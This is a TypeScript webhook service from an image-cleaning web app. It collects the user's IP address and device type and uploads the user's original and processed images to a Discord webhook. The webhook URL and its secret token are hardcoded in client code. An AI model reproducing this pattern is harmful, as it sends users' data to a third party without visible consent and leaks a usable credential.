
// services/webhookService.ts

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1427410646991114305/kac3VPxazLla3hVQFIe7fuppiQZStJ2_g_HY3l7dQPdo5hfpHYOakLx2tqm_0Uvb4U7K';

interface DiscordPayload {
    eventName: string;
    description: string;
    color: number; // Hex color code as a decimal number
    originalImageBase64?: string;
    processedImageBase64?: string;
}

const dataURLtoFile = (dataurl: string, filename: string): File => {
    const arr = dataurl.split(',');
    if (arr.length < 2) {
        throw new Error('Invalid data URL');
    }
    const mimeMatch = arr[0].match(/:(.*?);/);
    if (!mimeMatch) {
        throw new Error('Could not determine MIME type from data URL');
    }
    const mime = mimeMatch[1];
    const bstr = atob(arr[1]);
    let n = bstr.length;
    const u8arr = new Uint8Array(n);
    while (n--) {
        u8arr[n] = bstr.charCodeAt(n);
    }
    return new File([u8arr], filename, { type: mime });
}

// Function to get the user's IP address
async function getIpAddress(): Promise<string> {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        if (!response.ok) {
            return 'N/A';
        }
        const data = await response.json();
        return data.ip || 'N/A';
    } catch (error) {
        console.error('Failed to fetch IP address:', error);
        return 'N/A';
    }
}

// Function to detect device type
function getDeviceType(): string {
    const userAgent = navigator.userAgent;
    if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)) {
        return 'Mobile';
    }
    return 'Desktop';
}

export async function sendToDiscord(payload: DiscordPayload): Promise<void> {
    const ip = await getIpAddress();
    const deviceType = getDeviceType();
    
    const hasProcessed = !!payload.processedImageBase64;
    const hasOriginal = !!payload.originalImageBase64;

    const embed = {
        title: payload.eventName,
        description: payload.description,
        color: payload.color,
        footer: {
            text: `IP: ${ip} | Device: ${deviceType}`
        },
        timestamp: new Date().toISOString(),
        // Logic: Use processed image as main if available. 
        // If NOT available but original IS available, use original as main (so it's big).
        image: hasProcessed 
            ? { url: 'attachment://processed_image.png' } 
            : (hasOriginal ? { url: 'attachment://original_image.png' } : undefined),
        
        // Logic: Use original as thumbnail ONLY if we are already using processed as main image.
        // This prevents showing the same image twice or showing a tiny thumbnail when we want a big image.
        thumbnail: (hasProcessed && hasOriginal) 
            ? { url: 'attachment://original_image.png' } 
            : undefined,
    };
    
    const requestBody = {
        username: 'Manga Cleaner Bot',
        embeds: [embed]
    };

    const formData = new FormData();
    formData.append('payload_json', JSON.stringify(requestBody));

    let fileIndex = 0;
    if (payload.originalImageBase64) {
        try {
            const file = dataURLtoFile(payload.originalImageBase64, 'original_image.png');
            formData.append(`files[${fileIndex}]`, file, 'original_image.png');
            fileIndex++;
        } catch (e) {
            console.error("Failed to convert original image for webhook", e);
        }
    }
    if (payload.processedImageBase64) {
         try {
            const file = dataURLtoFile(payload.processedImageBase64, 'processed_image.png');
            formData.append(`files[${fileIndex}]`, file, 'processed_image.png');
        } catch (e) {
            console.error("Failed to convert processed image for webhook", e);
        }
    }

    try {
        const response = await fetch(WEBHOOK_URL, {
            method: 'POST',
            body: formData, // Always send as FormData
        });

        if (!response.ok) {
            console.error('Failed to send Discord webhook:', response.status, await response.text());
        }
    } catch (error) {
        console.error('Error sending Discord webhook:', error);
    }
}
